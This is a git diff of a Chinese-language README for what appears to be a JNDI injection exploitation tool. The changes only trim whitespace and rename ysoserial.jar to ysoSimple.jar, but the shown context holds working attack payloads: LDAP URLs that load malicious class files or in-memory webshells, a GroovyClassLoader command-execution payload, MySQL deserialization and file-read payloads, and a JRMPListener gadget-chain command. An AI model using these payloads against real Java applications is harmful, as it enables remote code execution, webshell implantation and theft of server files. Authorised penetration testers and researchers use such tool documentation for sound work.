@@ -1927,7 +1927,7 @@ ldap://127.0.0.1:1389/Basic/class_file/<base64-url-encoded-path-to-evil-class-fi
 
 ```python
 java.lang.String #判定BeanFactory打法是否可行，需要依托HTTP出网
-java.util.Base64 
+java.util.Base64
 javax.el.ELProcessor
 groovy.lang.GroovyShell
 groovy.lang.GroovyClassLoader
@@ -2025,7 +2025,7 @@ ldap://127.0.0.1:1389/GroovyClassLoader/auto_cmd/Y2FsYw==
 
 # 自定义字节码
 # 从运行JNDI所在的服务器路径上加载字节码(base64-url-encoded-path-to-evil-class-file为恶意字节码在服务器上的路径),可直接写jMG生成的内存马路径
-ldap://127.0.0.1:1389/GroovyClassLoader/class_file/<base64-url-encoded-path-to-evil-class-file> 
+ldap://127.0.0.1:1389/GroovyClassLoader/class_file/<base64-url-encoded-path-to-evil-class-file>
 ldap://127.0.0.1:1389/GroovyClassLoader/class_file//tmp/T3630456155100.class
 ldap://127.0.0.1:1389/GroovyClassLoader/class_file/L3RtcC9UMzYzMDQ1NjE1NTEwMC5jbGFzcw==
 ```
@@ -2127,24 +2127,24 @@ ldap://127.0.0.1:1389/Setter/JSVGCanvas/httplog/aHR0cDovLzEyNy4wLjAuMTo4MDAwLzEy
 3. 文件被重命名为原始名称，删除扩展名`.new`​
 
 ```java
-public void save() { 
-    ... 
+public void save() {
+    ...
     if (!isWriteable()) { // 8
         log.warn(sm.getString("memoryUserDatabase.notPersistable"));
         return;
-    } 
-   
+    }
+
     File fileNew = new File(this.pathnameNew); // 9
     if (!fileNew.isAbsolute()) {
         fileNew = new File(System.getProperty("catalina.base"), this.pathnameNew);
     }
-   
+
     this.writeLock.lock();
     try {
-        try(FileOutputStream fos = new FileOutputStream(fileNew); 
-            OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8); 
+        try(FileOutputStream fos = new FileOutputStream(fileNew);
+            OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8);
             PrintWriter writer = new PrintWriter(osw)) {
-   
+
             writer.println("<?xml version='1.0' encoding='utf-8'?>");
             writer.println("<tomcat-users xmlns=\"http://tomcat.apache.org/xml\"");
             writer.print("              ");
@@ -2152,42 +2152,42 @@ public void save() {
             writer.print("              ");
             writer.println("xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\"");
             writer.println("              version=\"1.0\">");
-   
+
             values = null;
             values = getRoles();
             while (values.hasNext()) {
                 writer.print("  ");
                 writer.println(values.next()); // 10
-            } 
+            }
             values = getGroups();
             while (values.hasNext()) {
                 writer.print("  ");
                 writer.println(values.next());
-            } 
+            }
             values = getUsers();
             while (values.hasNext()) {
                 writer.print("  ");
                 writer.println(((MemoryUser)values.next()).toXml());
-            } 
+            }
         } catch (IOException e) {
             ...
-        } 
+        }
         this.lastModified = fileNew.lastModified();
     } finally {
         this.writeLock.unlock();
-    } 
+    }
     ...
     File fileOrig = new File(this.pathname);
     ...
     if (!fileNew.renameTo(fileOrig)) { // 11
-        if (fileOld.exists() && 
+        if (fileOld.exists() &&
             !fileOld.renameTo(fileOrig)) {
             log.warn(sm.getString("memoryUserDatabase.restoreOrig", new Object[] { fileOld }));
         }
-   
+
         throw new IOException(sm.getString("memoryUserDatabase.renameNew", new Object[] { fileOrig
                 .getAbsolutePath() }));
-    } 
+    }
     if (fileOld.exists() && !fileOld.delete()) {
         throw new IOException(sm.getString("memoryUserDatabase.fileDelete", new Object[] { fileOld }));
     }
@@ -2283,7 +2283,7 @@ ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root
 ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
 ```
 
-##### ReadFile 
+##### ReadFile
 
 描述：[https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html)。在mysql文档中的说到，服务端可以要求客户端读取有可读权限的任何文件。适用于mysql-connector-java全版本。关于Mysql连接读文件的原理可以参考：[MySQL任意文件读取](https://xz.aliyun.com/t/12011)。
 
@@ -2560,7 +2560,7 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
         e.addAttribute("javaReferenceAddress", "#" + posn + "#" + addr.getType() + "#" + addr.getContent());
         posn ++;
     }
-  
+
     // ......
 }
 ```
@@ -2580,7 +2580,7 @@ public void processSearchResult(InMemoryInterceptedSearchResult searchResult) {
 1. JRMPListener开启RMI服务端监听：
 
 ```java
-java -cp ysoserial.jar cn.butler.yso.exploit.JRMPListener 1234 Jackson "Templateslmpl:sleep:10"
+java -cp ysoSimple.jar cn.butler.yso.exploit.JRMPListener 1234 Jackson "Templateslmpl:sleep:10"
 ```
 
 RMI Payload：
